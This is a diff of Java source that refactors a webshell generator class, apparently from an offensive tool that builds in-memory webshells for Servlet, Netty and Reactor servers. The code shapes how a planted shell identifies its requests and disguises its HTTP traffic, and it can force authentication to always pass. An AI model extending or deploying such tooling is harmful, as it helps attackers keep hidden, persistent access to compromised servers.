@@ -1,11 +1,6 @@
 package com.reajason.noone.core.generator;
 
-import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
 import com.reajason.javaweb.memshell.ShellType;
-import com.reajason.javaweb.memshell.config.ShellConfig;
-import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
-import com.reajason.javaweb.utils.CommonUtil;
-import com.reajason.noone.core.NoOneCore;
 import com.reajason.noone.core.generator.identifier.NettyHttpIdentifierVisitor;
 import com.reajason.noone.core.generator.identifier.ReactorIdentifierVisitor;
 import com.reajason.noone.core.generator.identifier.ServletIdentifierVisitor;
@@ -20,55 +15,35 @@ import com.reajason.noone.server.profile.config.HttpProtocolConfig;
 import com.reajason.noone.server.profile.config.HttpRequestBodyType;
 import com.reajason.noone.server.profile.config.IdentifierConfig;
 import com.reajason.noone.server.profile.config.ProtocolConfig;
-import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import net.bytebuddy.implementation.FixedValue;
 
-import java.util.Base64;
-
 import static net.bytebuddy.matcher.ElementMatchers.*;
 
-public class NoOneMemShellGenerator extends ByteBuddyShellGenerator<NoOneConfig> {
+public class ProfileVisitorWrapper {
+    public static DynamicType.Builder<?> extend(
+            DynamicType.Builder<?> builder, Profile profile,
+            String shellType, String shellClassName) {
 
-    public NoOneMemShellGenerator(ShellConfig shellConfig, NoOneConfig shellToolConfig) {
-        super(shellConfig, shellToolConfig);
-    }
-
-    @Override
-    protected DynamicType.Builder<?> getBuilder() {
-        DynamicType.Builder<?> builder = new ByteBuddy().redefine(shellToolConfig.getShellClass());
-
-        try (DynamicType.Unloaded<NoOneCore> unloaded = new ByteBuddy()
-                .redefine(NoOneCore.class)
-                .name(CommonUtil.generateClassName())
-                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
-                .make()) {
-            String coreGzipBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(unloaded.getBytes()));
-            builder = builder.field(named("coreGzipBase64")).value(coreGzipBase64);
-        }
-
-        Profile profile = shellToolConfig.getProfile();
-        if (profile == null) {
-            return builder;
-        }
-
-        builder = applyIdentifierConfig(builder, profile.getIdentifier());
+        builder = applyIdentifierConfig(builder, profile.getIdentifier(), shellType);
 
         ProtocolConfig protocolConfig = profile.getProtocolConfig();
         if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
-            builder = applyHttpProtocolConfig(builder, httpConfig);
+            builder = applyHttpProtocolConfig(builder, httpConfig, shellType, shellClassName);
         }
 
         builder = TransformWrapper.extend(builder, profile);
-
         return builder;
     }
 
-    private DynamicType.Builder<?> applyIdentifierConfig(DynamicType.Builder<?> builder, IdentifierConfig identifier) {
+
+    private static DynamicType.Builder<?> applyIdentifierConfig(
+            DynamicType.Builder<?> builder, IdentifierConfig identifier,
+            String shellType) {
         if (identifier != null) {
-            var implementation = isReactorShell(shellConfig.getShellType())
+            var implementation = isReactorShell(shellType)
                     ? new ReactorIdentifierVisitor(identifier)
-                    : isNettyHttpShell(shellConfig.getShellType())
+                    : isNettyHttpShell(shellType)
                     ? new NettyHttpIdentifierVisitor(identifier)
                     : new ServletIdentifierVisitor(identifier);
             return builder
@@ -81,25 +56,27 @@ public class NoOneMemShellGenerator extends ByteBuddyShellGenerator<NoOneConfig>
         return builder.method(named("isAuthed")).intercept(FixedValue.value(true));
     }
 
-    private DynamicType.Builder<?> applyHttpProtocolConfig(
+    private static DynamicType.Builder<?> applyHttpProtocolConfig(
             DynamicType.Builder<?> builder,
-            HttpProtocolConfig httpConfig
+            HttpProtocolConfig httpConfig,
+            String shellType,
+            String shellClassName
     ) {
         HttpRequestBodyType requestBodyType = httpConfig.getRequestBodyType();
         String requestTemplate = httpConfig.getRequestTemplate();
 
-        if (isNettyHttpShell(shellConfig.getShellType())) {
+        if (isNettyHttpShell(shellType)) {
             builder = NettyGetPayloadFromContentWrapper.extend(builder, requestBodyType, requestTemplate);
-        } else if (isReactorShell(shellConfig.getShellType())) {
+        } else if (isReactorShell(shellType)) {
             builder = ReactorGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
         } else {
             builder = ServletGetPayloadFromRequestWrapper.extend(builder, requestBodyType, requestTemplate);
         }
 
-        builder = WrapResDataWrapper.extend(builder, shellToolConfig.getShellClassName(),
+        builder = WrapResDataWrapper.extend(builder, shellClassName,
                 httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate());
 
-        builder = WrapResWrapper.extend(builder, shellConfig.getShellType(),
+        builder = WrapResWrapper.extend(builder, shellType,
                 httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders());
 
         return builder;
